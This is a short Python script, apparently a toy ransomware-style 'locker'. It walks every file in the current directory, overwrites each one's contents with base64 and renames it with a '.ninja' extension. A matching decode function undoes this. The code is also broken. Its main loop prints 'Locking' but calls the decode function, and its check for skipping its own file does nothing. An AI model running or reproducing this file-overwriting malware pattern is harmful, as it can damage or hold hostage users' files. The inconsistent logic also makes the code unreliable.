import os, base64

def enc(fn):
	try:
		file = open(fn).read().encode()
		enc = base64.b64encode(file)
		f2 = open(fn, 'w')
		f2.write(enc.decode())
		os.rename(fn, fn+'.ninja')
		print('[Success]\n==================')
	except:
		print('[Failed]\n==================')


def dec(fn):
	try:
		file = open(fn).read().encode()
		enc = base64.b64decode(file)
		f2 = open(fn, 'w')
		f2.write(enc.decode())
		realname = fn.replace('.ninja','')
		os.rename(fn, realname)
		print('[Success]\n==================')
	except:
		print('[Failed]\n==================')

file = os.listdir()
for f_name in file:
	if os.path.isfile(f_name):
		if f_name == os.path.basename(__file__):
			pass
		print('Locking: '+f_name)
		dec(f_name)
